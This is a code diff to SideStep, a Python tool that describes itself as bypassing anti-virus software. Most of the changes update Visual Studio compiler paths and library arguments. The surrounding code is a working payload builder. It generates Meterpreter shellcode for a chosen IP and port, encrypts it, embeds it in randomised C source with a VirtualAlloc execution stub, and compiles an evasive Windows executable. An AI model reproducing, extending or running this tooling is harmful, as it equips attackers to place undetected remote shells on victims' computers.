@@ -10,7 +10,7 @@ Description:    SideStep is yet another tool to bypass anti-virus software.  The
 Software Requirements:
 Metasploit Community 4.11.1 - Update 2015031001 (or later)
 Ruby 2.x
-Windows (Tested on 7, 8, and 10)<BR>
+Windows (Tested on 7, 8, and 10)
 Python 2.7.x
 Visual Studio (free editions should be fine - tested on 2012 and 2015)
 Cygwin with strip utility (if you want to strip debug symbols)
@@ -78,7 +78,7 @@ def main(argv):
 
   ip = args['ip']
   port = args['port']
-  clOptions = '/GS /GL /analyze- /Zc:wchar_t /Zi /Gm /O2 /sdl /fp:precise /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "_UNICODE" /D "UNICODE" /errorReport:prompt /WX- /Zc:forScope /Gd /Oy- /Oi /MT /EHsc /Fe"' + settings.exeDir + path_delim + args['exe'] + '" /Fo"' + settings.exeDir + path_delim + args['exe'].split('.')[0]  + '.obj" /Fd"' + settings.exeDir + path_delim + args['exe'].split('.')[0]  + '" /nologo /I"' + settings.vsPath + path_delim + 'include" /I"' + settings.vsPath + path_delim + 'atlmfc' + path_delim + 'include" /I"' + settings.sdkPath + path_delim + 'Include" /I"' + settings.kitPathIncl + '" "' + settings.sdkPath + path_delim + 'Lib' + path_delim + 'AdvAPI32.Lib" "' + settings.sdkPath + path_delim + 'Lib' + path_delim + 'Uuid.Lib" "' + settings.sdkPath + path_delim + 'Lib' + path_delim + 'Kernel32.Lib" "' + settings.kitPathLib + path_delim + 'libucrt.lib" ' + settings.cryptLibPath + ' ' + settings.sourceDir + path_delim + args['file']
+  clOptions = '/GS /GL /analyze- /Zc:wchar_t /Zi /Gm /O2 /sdl /fp:precise /D WIN32 /D "NDEBUG" /D "_CONSOLE" /D "_UNICODE" /D "UNICODE" /errorReport:prompt /WX- /Zc:forScope /Gd /Oy- /Oi /MT /EHsc /Fe"' + settings.exeDir + path_delim + args['exe'] + '" /Fo"' + settings.exeDir + path_delim + args['exe'].split('.')[0]  + '.obj" /Fd"' + settings.exeDir + path_delim + args['exe'].split('.')[0]  + '" /nologo /I"' + settings.vsPath + path_delim + 'include" /I"' + settings.vsPath + path_delim + 'atlmfc' + path_delim + 'include" /I"' + settings.sdkPathIncl + '" /I"' + settings.kitPathIncl + '" /I"' + settings.winApiIncl + '" "' + settings.sdkPathLib + path_delim + 'AdvAPI32.Lib" "' + settings.sdkPathLib + path_delim + 'Uuid.Lib" "' + settings.sdkPathLib + path_delim + 'Kernel32.Lib" "' + settings.kitPathLib + path_delim + 'libucrt.lib" "' + settings.vsMsvcrtLib + path_delim + 'libcpmt.lib" "' + settings.vsMsvcrtLib + path_delim + 'libcmt.lib" "' + settings.vsMsvcrtLib + path_delim + 'oldnames.lib" "' + settings.vsMsvcrtLib + path_delim + 'libvcruntime.lib" ' + settings.cryptLibPath + ' '
   
   print '[+]  Preparing to create a Meterpreter executable'
 
@@ -113,7 +113,7 @@ def main(argv):
   curTimeVar = rng.genVar(settings.randomVarSize)
 
   print '[-]\tCompiling CryptoPP library'
-  cryptopp.compileCryptoPP(path_delim, settings.sourceDir, settings.vsPath, settings.sdkPath, settings.kitPathIncl)
+  cryptopp.compileCryptoPP(path_delim, settings.sourceDir, settings.vsPath, settings.sdkPathIncl, settings.kitPathIncl, settings.winApiIncl, settings.vsToolsPath)
 
   print '[-]\tGenerating the Meterpreter shellcode'
   clearPayload = msfpayload.payloadGenerator(settings.msfpath, settings.msfvenom, settings.msfmeterpreter, ip, port, settings.MsfOptions)
@@ -151,11 +151,13 @@ def main(argv):
   src += codesegments.virtualAllocStub(virtAllocFuncVar, virtAllocFuncParam, virtAllocLen, virtAllocPid, virtAllocCode, virtAllocAddr, virtAllocPage_size, execFuncVar, execParamVar) + "\n"
 
   print '[-]\tWriting the source code to ' + settings.sourceDir + path_delim + args['file']
+  # Write main source
   sourceFile.write(src)
   sourceFile.close()
-
+  
+  # Compile SideStep
   print '[-]\tCompiling the executable to ' + settings.exeDir + path_delim + args['exe']
-  subprocess.Popen('cl ' + clOptions, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+  subprocess.Popen(settings.vsToolsPath + path_delim + 'cl.exe ' + clOptions + settings.sourceDir + path_delim + args['file'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
   time.sleep(30)
 
   if settings.useStrip == 1:
